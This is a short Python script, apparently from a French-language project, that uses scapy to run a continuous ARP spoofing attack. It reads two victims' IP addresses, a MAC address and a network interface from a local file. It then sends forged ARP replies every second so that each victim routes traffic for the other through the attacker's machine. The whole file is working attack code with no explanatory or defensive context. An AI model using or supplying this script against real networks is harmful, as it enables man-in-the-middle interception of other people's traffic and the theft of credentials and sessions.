from scapy.all import *
import time


fichier = open("Resources/informations.txt", "r")
contenu = fichier.read().split()
fichier.close()

ip_victime1 = contenu[0]
ip_victime2 = contenu[2]
mac = contenu[5]
iface = contenu[6]

while 1:
    send(ARP(pdst = ip_victime1, psrc = ip_victime2, hwsrc = mac), iface=iface, verbose=False)
    send(ARP(pdst = ip_victime2, psrc = ip_victime1, hwsrc = mac), iface=iface, verbose=False)
    time.sleep(1)